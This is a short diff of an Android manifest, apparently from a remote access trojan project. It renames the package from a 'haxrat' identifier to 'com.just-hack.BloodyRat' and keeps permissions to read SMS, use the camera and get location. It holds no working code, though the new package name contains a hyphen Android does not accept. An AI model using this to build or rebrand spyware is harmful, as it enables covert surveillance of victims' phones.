@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:obfuscation="http://schemas.android.com/apk/res/android" obfuscation:versionCode="1" obfuscation:versionName="1.0-beta" package="com.hax4us.haxrat" platformBuildVersionCode="27" platformBuildVersionName="8.1.0">
+<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:obfuscation="http://schemas.android.com/apk/res/android" obfuscation:versionCode="1" obfuscation:versionName="1.0" package="com.just-hack.BloodyRat" platformBuildVersionCode="27" platformBuildVersionName="8.1.0">
     <uses-feature obfuscation:name="android.hardware.camera"/>
     <uses-permission obfuscation:name="android.permission.READ_SMS"/>
     <uses-permission obfuscation:name="android.permission.ACCESS_COARSE_LOCATION"/>
